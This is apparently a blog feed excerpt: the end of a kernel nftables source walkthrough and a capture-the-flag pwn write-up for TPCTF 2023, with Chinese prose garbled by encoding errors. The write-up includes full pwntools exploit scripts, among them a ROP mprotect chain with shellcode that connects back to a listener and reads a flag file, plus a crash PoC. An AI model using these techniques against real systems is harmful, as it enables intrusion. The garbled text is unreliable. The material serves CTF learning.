skb-&gt;ip_summed != CHECKSUM_PARTIAL)) &#123;<br>        <br>fsum = skb_checksum(skb, offset, priv-&gt;len, <span class="hljs-number">0</span>);<span class="hljs-comment">// è®¡ç®—æˆ‘ä»¬è¦æ›´æ”¹éƒ¨åˆ†çš„checksum</span><br>tsum = csum_partial(src, priv-&gt;len, <span class="hljs-number">0</span>);<span class="hljs-comment">// è®¡ç®—æˆ‘ä»¬è¦æ”¹æˆçš„å†…å®¹çš„checksum</span><br><br>        <span class="hljs-comment">// IPæ ¡éªŒï¼Œæ›´æ–°payloadçš„checksum</span><br><span class="hljs-keyword">if</span> (priv-&gt;csum_type == NFT_PAYLOAD_CSUM_INET &amp;&amp;<br>    nft_payload_csum_inet(skb, src, fsum, tsum, csum_offset))<br><span class="hljs-keyword">goto</span> err;<br><br>        <span class="hljs-comment">// å››çº§æ ¡éªŒï¼Œæ›´æ–°payloadçš„checksum</span><br><span class="hljs-keyword">if</span> (priv-&gt;csum_flags &amp;&amp;<br>    nft_payload_l4csum_update(pkt, skb, fsum, tsum) &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err;<br>&#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 4. æ›´æ”¹header</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">if</span> (skb_ensure_writable(skb, max(offset + priv-&gt;len, <span class="hljs-number">0</span>)) ||<br>    skb_store_bits(skb, offset, src, priv-&gt;len) &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 5. é‡æ–°è®¡ç®—SCTPçš„checksum</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">if</span> (priv-&gt;csum_type == NFT_PAYLOAD_CSUM_SCTP &amp;&amp;<br>    pkt-&gt;tprot == IPPROTO_SCTP &amp;&amp;<br>    skb-&gt;ip_summed != CHECKSUM_PARTIAL) &#123;<span class="hljs-comment">// è¿˜æ²¡è¿›è¡Œæ ¡éªŒ</span><br><span class="hljs-keyword">if</span> (pkt-&gt;fragoff == <span class="hljs-number">0</span> &amp;&amp;<br>    nft_payload_csum_sctp(skb, nft_thoff(pkt)))<br><span class="hljs-keyword">goto</span> err;<br>&#125;<br><br><span class="hljs-keyword">return</span>;<br>err:<br>regs-&gt;verdict.code = NFT_BREAK;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>nft_payload_eval</strong></p><ul><li>è·å–ç»å¯¹offset</li><li>è¯»è¿›ç›®æ ‡å¯„å­˜å™¨</li><li>å¦‚æœå‡ºé”™break</li></ul></li><li><p><strong>nft_payload_fast_eval</strong></p><ul><li>è·å–è¯»å–çš„æŒ‡é’ˆptr</li><li>åˆ¤æ–­ptræœ‰æ²¡æœ‰è¶Šç•Œ</li><li>ç›´æ¥ä½¿ç”¨*ï¼Œå› ä¸ºfastéƒ½æ˜¯2çš„power</li></ul></li></ul></li></ul><h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><ul><li>rcuæ˜¯ä»€ä¹ˆ</li></ul>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>Source Code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>source code</tag>
      
      <tag>nft</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023 TPCTF pwn wp</title>
    <link href="/2024/01/28/2023TPCTFpwnwp/"/>
    <url>/2024/01/28/2023TPCTFpwnwp/</url>
    
    <content type="html"><![CDATA[<p>o4èµ¢ä½†æˆ‘çˆ†é›¶çš„ä¸€é›†ï¼Œä¸»é¢˜ï¼šæ´å‘¢ï¼Ÿï¼Ÿï¼Ÿä¸ºä»€ä¹ˆæ‰¾ä¸åˆ°æ´å•Šï¼ï¼ï¼</p><span id="more"></span><h1 id="httpd"><a href="#httpd" class="headerlink" title="httpd"></a>httpd</h1><h2 id="é€†å‘"><a href="#é€†å‘" class="headerlink" title="é€†å‘"></a>é€†å‘</h2><p>httpè¦æ±‚ğŸ‘‡</p><ul><li><p>Content-Lengthï¼šæŒ‡å®šdataé•¿åº¦ï¼ŒPOSTæ–¹æ³•å¿…é¡»æœ‰</p></li><li><p>Stdoutï¼šå¯ä»¥æŒ‡å®šè¾“å‡ºçš„fd</p></li><li><p>GETçš„å¯é€‰url</p><ul><li><p>init</p><p>åˆå§‹åŒ–rootç”¨æˆ·çš„passwdï¼Œæ–°å»ºä¸€ä¸ªuser_noteå¹¶æ’å…¥</p></li><li><p>test</p><p>è¾“å‡ºtest123123</p></li><li><p>setlocale</p><p>è°ƒç”¨setlocale</p></li><li><p>register</p><p>æ–°å»ºä¸€ä¸ªuser_noteï¼Œéœ€è¦usernameï¼Œpasswdï¼Œuidå’Œlens</p></li><li><p>logoff</p><p>éœ€è¦usernameå’Œpasswdï¼Œåˆ é™¤å¯¹åº”user_note</p></li><li><p>show</p><p>éœ€è¦usernameå’Œpasswï¼Œè¾“å‡ºå¯¹åº”user_noteçš„å†…å®¹</p></li><li><p>poweroff</p><p>é€€å‡º</p></li></ul></li><li><p>POSTå¯ä»¥è¾“å…¥noteå†…å®¹ï¼Œéœ€è¦usenameå’Œpasswd</p></li></ul><h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><ul><li><p>ä½¿ç”¨showåŠŸèƒ½è¾“å‡ºuser_noteå†…å®¹æ—¶æœ€ç»ˆä¼šè°ƒç”¨bad_400ï¼ˆè¾“å‡º400 BAD REQUESTçš„å‡½æ•°ï¼‰ï¼Œå°†note-&gt;bufferä¸­å†…å®¹å¤åˆ¶åˆ°sæ•°ç»„ä¸­</p><img src="/2024/01/28/2023TPCTFpwnwp/bad400.png" class title="bad400"><p>registerå¯ä»¥ç”³è¯·çš„æœ€å¤§å¤§å°æ˜¯0x400ï¼Œsçš„å¤§å°æ˜¯0x408ï¼Œä½†rootçš„noteå¤§å°æ˜¯0x4f8ï¼Œå¯ä»¥æº¢å‡º</p></li><li><p>rootçš„å¯†ç æ˜¯ä¼ªéšæœºï¼Œå¯ä»¥é¢„æµ‹</p><img src="/2024/01/28/2023TPCTFpwnwp/passwd.png" class title="passwd"><p>ç¼–ä¸€ä¸ªè¿™æ ·çš„ç¨‹åºï¼Œéœ€è¦çš„æ—¶å€™è°ƒç”¨</p></li><li><p>showå’Œæ›´æ”¹noteå†…å®¹éœ€è¦uid &#x3D;&#x3D; 0ï¼Œè¿˜é™åˆ¶äº†uid !&#x3D; 0</p><img src="/2024/01/28/2023TPCTFpwnwp/uid.png" class title="uid"><p>ä½†uidæ˜¯æ ¹æ® : çš„ä¸ªæ•°åˆ¤æ–­çš„ï¼Œæˆ‘ä»¬å¯ä»¥è¾“å…¥å½¢å¦‚ aâ€‹:b:0 çš„usernameï¼Œè¿™æ ·ä¼šæŠŠuidåˆ¤å®šä¸º0</p></li><li><p>setlocaleæœ‰cveï¼ˆç¬¬ä¸€æ¬¡åœ¨pwné¢˜è§åˆ©ç”¨cveï¼Œå­¤é™‹å¯¡é—»äº†(lllï¿¢Ï‰ï¿¢)ï¼‰</p><img src="/2024/01/28/2023TPCTFpwnwp/cve.png" class title="cve"><p>ä»pocå¯ä»¥çœ‹å‡ºåœ¨setlocaleä¹‹åä½¿ç”¨å¯¹é½æœ‰ä¸¤å­—èŠ‚çš„æº¢å‡º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;locale.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (setlocale (LC_ALL, <span class="hljs-string">&quot;&quot;</span>))<br>    &#123;<br>      <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;1234567890123:\n&quot;</span>);<br>      <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;%0+ -&#x27;13ld:\n&quot;</span>, <span class="hljs-number">1234567L</span>);<br>    &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç†è®ºä¸Šåº”è¯¥è¾“å‡ºğŸ‘‡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">1234567890123:<br>+1,234,567   :<br><br>1234567890123:<br>+1,234,567     :<br></code></pre></td></tr></table></figure><p>ä½†å®é™…ä¸ŠğŸ‘†</p><p>registerä¸­å°±ä½¿ç”¨äº†å¯¹é½</p><img src="/2024/01/28/2023TPCTFpwnwp/overflow.png" class title="overflow"><p>user_noteç»“æ„ä½“çš„å¸ƒå±€ğŸ‘‡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_note</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_note</span> *<span class="hljs-title">prev</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_note</span> *<span class="hljs-title">next</span>;</span><br>    <span class="hljs-type">char</span> name[<span class="hljs-number">32</span>];<br>    <span class="hljs-type">char</span> *buffer;<br>    <span class="hljs-type">size_t</span> buffer_size;<br>&#125;<br></code></pre></td></tr></table></figure><p>nameç†è®ºä¸Šæœ€å¤š31å­—èŠ‚ï¼Œæº¢å‡ºä¸¤å­—èŠ‚ï¼Œåªè¦èƒ½æº¢å‡ºä¸€ä¸ªâ€™\x00â€™åˆ°bufferæŒ‡é’ˆå°±èƒ½ä¿®æ”¹åˆ«çš„å †å—æˆ–è€…æ³„éœ²åœ°å€ï¼ˆå®æµ‹å¯ä»¥æº¢å‡ºä¸€ä¸ªç©ºå­—èŠ‚ï¼‰</p><p>æ˜¯å¦èƒ½è§¦å‘ä¼¼ä¹ä¸è¦å¯¹é½çš„å­—ç¬¦ä¸²é•¿åº¦æœ‰å…³</p></li><li><p>è¿˜è¦æ³¨æ„æ¯æ¬¡å¾ªç¯éƒ½ä¼šclose(fd[0])ï¼Œæ‰€ä»¥stdoutå’Œstderræœ€å¤šæ³„éœ²ä¸¤æ¬¡ï¼Œä¸éœ€è¦æ³„éœ²çš„æ—¶å€™è¦é€šè¿‡Stdouté‡ç½®fd</p></li></ul><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><ul><li><p>æ”¹bufferæŒ‡é’ˆåˆ°æ ˆä¸Šå†™ROPé“¾mprotectï¼Œæ”¹æ ˆçš„æƒé™ä¸º7</p></li><li><p>å†™shellcodeè¿›è¡Œconnectåorwï¼Œå¦èµ·ä¸€ä¸ªncç›‘å¬ç«¯å£</p><img src="/2024/01/28/2023TPCTFpwnwp/flag.png" class title="flag"></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init</span>(<span class="hljs-params">fd</span>):<br>    http=<span class="hljs-string">b&#x27;GET /init\nStdout: &#x27;</span>+<span class="hljs-built_in">str</span>(fd).encode()+<span class="hljs-string">b&#x27;\n&#x27;</span><br>    p.sendline(http)<br>    rand=process(<span class="hljs-string">&#x27;./get_rand&#x27;</span>)<br>    value=rand.recv(<span class="hljs-number">13</span>)<br>    rand.close()<br>    <span class="hljs-keyword">return</span> value<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setlocal</span>(<span class="hljs-params">data,fd</span>):<br>    http=<span class="hljs-string">b&#x27;GET /setlocale?&#x27;</span>+data+<span class="hljs-string">b&#x27;\nStdout: &#x27;</span>+<span class="hljs-built_in">str</span>(fd).encode()+<span class="hljs-string">b&#x27;\n&#x27;</span><br>    p.sendline(http)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reg</span>(<span class="hljs-params">name,pawd,uid,size,fd</span>):<br>    http=<span class="hljs-string">b&#x27;GET /register?&#x27;</span>+<span class="hljs-string">b&#x27;username=&#x27;</span>+name+<span class="hljs-string">b&#x27;&amp;password=&#x27;</span>+pawd+<span class="hljs-string">b&#x27;&amp;uid=&#x27;</span>+<span class="hljs-built_in">str</span>(uid).encode()+<span class="hljs-string">b&#x27;&amp;len=&#x27;</span>+<span class="hljs-built_in">str</span>(size).encode()+<span class="hljs-string">b&#x27;\nStdout: &#x27;</span>+<span class="hljs-built_in">str</span>(fd).encode()+<span class="hljs-string">b&#x27;\n&#x27;</span><br>    p.sendline(http)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">logoff</span>(<span class="hljs-params">name,pawd,fd</span>):<br>    http=<span class="hljs-string">b&#x27;GET /logoff?&#x27;</span>+<span class="hljs-string">b&#x27;username=&#x27;</span>+name+<span class="hljs-string">b&#x27;&amp;password=&#x27;</span>+pawd+<span class="hljs-string">b&#x27;\nStdout: &#x27;</span>+<span class="hljs-built_in">str</span>(fd).encode()+<span class="hljs-string">b&#x27;\n&#x27;</span><br>    p.sendline(http)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">name,pawd,fd</span>):<br>    http=<span class="hljs-string">b&#x27;GET /show?&#x27;</span>+<span class="hljs-string">b&#x27;username=&#x27;</span>+name+<span class="hljs-string">b&#x27;&amp;password=&#x27;</span>+pawd+<span class="hljs-string">b&#x27;\nStdout: &#x27;</span>+<span class="hljs-built_in">str</span>(fd).encode()+<span class="hljs-string">b&#x27;\n&#x27;</span><br>    p.sendline(http)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">name,pawd,data,fd</span>):<br>    http=<span class="hljs-string">b&#x27;POST /note?&#x27;</span>+<span class="hljs-string">b&#x27;username=&#x27;</span>+name+<span class="hljs-string">b&#x27;&amp;password=&#x27;</span>+pawd+<span class="hljs-string">b&#x27;\nContent-Length: &#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(data)).encode()+<span class="hljs-string">b&#x27;\nStdout: &#x27;</span>+<span class="hljs-built_in">str</span>(fd).encode()+<span class="hljs-string">b&#x27;\n&#x27;</span><br>    p.sendline(http)<br>    sleep(<span class="hljs-number">1</span>)<br>    p.send(data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit_</span>():<br>    http=<span class="hljs-string">b&#x27;GET /poweroff\n&#x27;</span><br>    p.sendline(http)<br><br>p=process(<span class="hljs-string">&#x27;./httpd&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;/home/eurus/ZZZCTF/tpctf/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>passwd=init(<span class="hljs-number">3</span>)<br>logoff(<span class="hljs-string">b&#x27;root&#x27;</span>,passwd,<span class="hljs-number">3</span>)<br>passwd=init(<span class="hljs-number">3</span>)<br>show(<span class="hljs-string">b&#x27;root&#x27;</span>,passwd,<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\r\n\r\n&#x27;</span>)<br>libcbase=u64(p.recvuntil(<span class="hljs-string">b&#x27;\r\n&#x27;</span>)[:-<span class="hljs-number">2</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x1f6ce0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><br>setlocal(<span class="hljs-string">b&#x27;=&#x27;</span>, <span class="hljs-number">3</span>)<br>reg(<span class="hljs-string">b&#x27;a:a:0&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0x110</span>,<span class="hljs-number">3</span>)<br>reg(<span class="hljs-string">b&#x27;b:b:0&#x27;</span>,<span class="hljs-string">b&#x27;b&#x27;</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">3</span>)<br>reg(<span class="hljs-string">b&#x27;c:c:0&#x27;</span>,<span class="hljs-string">b&#x27;c&#x27;</span>,<span class="hljs-number">1000</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">3</span>)<br><br>environ_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;environ&#x27;</span>]<br>payload=p64(environ_addr)+p64(<span class="hljs-number">0x1000</span>)<br>edit(<span class="hljs-string">b&#x27;c&#x27;</span>,<span class="hljs-string">b&#x27;c&#x27;</span>,payload,<span class="hljs-number">3</span>)<br><br>show(<span class="hljs-string">b&#x27;b&#x27;</span>,<span class="hljs-string">b&#x27;b&#x27;</span>,<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\r\n\r\n&#x27;</span>)<br>stack=u64(p.recvuntil(<span class="hljs-string">b&#x27;\r\n&#x27;</span>)[:-<span class="hljs-number">2</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>payload=p64(stack-<span class="hljs-number">0x160</span>)+p64(<span class="hljs-number">0x1000</span>)<br>edit(<span class="hljs-string">b&#x27;c&#x27;</span>,<span class="hljs-string">b&#x27;c&#x27;</span>,payload,<span class="hljs-number">3</span>)<br><br>rdi_addr=libcbase+<span class="hljs-number">0x240e5</span><br>rsi_addr=libcbase+<span class="hljs-number">0x2573e</span><br>rdx_addr=libcbase+<span class="hljs-number">0x26302</span><br>mprotect=libcbase+libc.symbols[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>payload=p64(rdi_addr)+p64(stack&amp;<span class="hljs-number">0xfffffffffffff000</span>)+p64(rsi_addr)+p64(<span class="hljs-number">0x2000</span>)+p64(rdx_addr)+p64(<span class="hljs-number">7</span>)+p64(mprotect)<br>payload+=p64(stack-<span class="hljs-number">0x120</span>)<br>payload+=asm(shellcraft.connect(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9001</span>))<br>payload+=asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>)+shellcraft.read(<span class="hljs-number">2</span>,stack+<span class="hljs-number">0x1000</span>,<span class="hljs-number">0x100</span>)+shellcraft.write(<span class="hljs-number">1</span>,stack+<span class="hljs-number">0x1000</span>,<span class="hljs-number">0x100</span>))<br>edit(<span class="hljs-string">b&#x27;b&#x27;</span>,<span class="hljs-string">b&#x27;b&#x27;</span>,payload,<span class="hljs-number">3</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="tpgc"><a href="#tpgc" class="headerlink" title="tpgc"></a>tpgc</h1><p>ä¸ªäººç»éªŒï¼Œc++ä¸æ˜¯ç”¨æ¥é€†çš„ä¹Ÿä¸æ˜¯ç”¨æ¥çœ‹çš„(Ë‰â–½Ë‰ï¼›)ï¼Œä¸»æ‰“ä¸€ä¸ªç›²çŒœ</p><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>ä¸€ä¸ªèœå•ï¼Œæœ‰rubyï¼Œrodå’Œweaponä¸‰ä¸ªæ ˆï¼ŒåŠŸèƒ½</p><ul><li>add<ul><li>take_rubyï¼šaddï¼Œpush rubyï¼Œå¯ä»¥è¾“å…¥name</li><li>take_rodï¼šaddï¼Œpush rodï¼Œå¯ä»¥è¾“å…¥name</li><li>fuseï¼špop rubyï¼Œpop rod addï¼Œpush weaponï¼Œå¯ä»¥è¾“å…¥name</li></ul></li><li>delete<ul><li>drop_rubyï¼špopï¼Œdelete ruby</li><li>drop_rodï¼špopï¼Œdelete rod</li><li>dropï¼špopï¼Œdelete weaponï¼Œpush rubyï¼Œpush rod</li></ul></li></ul><p>æ ¹æ®ä¸¤ä¸ªwpç¼©è¿‡çš„poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">take_ruby</span>(<span class="hljs-params">name</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Sign the name of the new owner here:\n&#x27;</span>,name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">drop_ruby</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">take_rod</span>(<span class="hljs-params">name</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Sign the name of the new owner here:\n&#x27;</span>,name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">drop_rod</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fuse</span>(<span class="hljs-params">name</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Sign the name of the one who wants to fuse this new weapon here:\n&#x27;</span>,name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">drop</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exitt</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;7&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">default</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;8&#x27;</span>)<br><br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>take_rod(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x781</span>)<br>take_ruby(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">4</span>)<br>fuse(<span class="hljs-string">b&#x27;c&#x27;</span>)<br>drop()<br>drop_rod()<br>p.interactive()<br></code></pre></td></tr></table></figure><img src="/2024/01/28/2023TPCTFpwnwp/crash.png" class title="crash"><ul><li>å¥½åƒæ˜¯æŠŠrubyå’Œrodæ‹¼æ¥ådrop_rodå¯„äº†ï¼Œå…ˆæ‹¼çš„rubyå†æ‹¼çš„rodï¼Œå®é™…æ‰§è¡Œçš„å°±æ˜¯ (*ruby_name)(ruby_name)ï¼Œä»¤ruby_nameä¸ºprintfçš„gotè¡¨åœ°å€å°±èƒ½æ³„éœ²libcåŸºå€äº†</li><li>æ²¡å¼€pie+aslréƒ¨åˆ†å¼€å¯ï¼Œå †åŸºå€æ˜¯ä¸å˜çš„ï¼Œå¯ä»¥å…ˆæŠŠone_gadgetçš„åœ°å€å†™åˆ°å †ä¸Šï¼Œå†ä»¤ruby_nameä¸ºè¿™ä¸ªå †åœ°å€</li></ul><p>psï¼šæ¯”èµ›çš„æ—¶å€™æˆ‘æ²¡æœ‰è¯•è¿‡dropä¹‹ådrop_rodï¼Œä¹Ÿæ²¡æœ‰è¯•è¿‡é•¿è¾“å…¥(lllï¿¢Ï‰ï¿¢)ï¼Œè®°ä½äº†</p><h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">take_ruby</span>(<span class="hljs-params">name</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Sign the name of the new owner here:\n&#x27;</span>,name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">drop_ruby</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">take_rod</span>(<span class="hljs-params">name</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    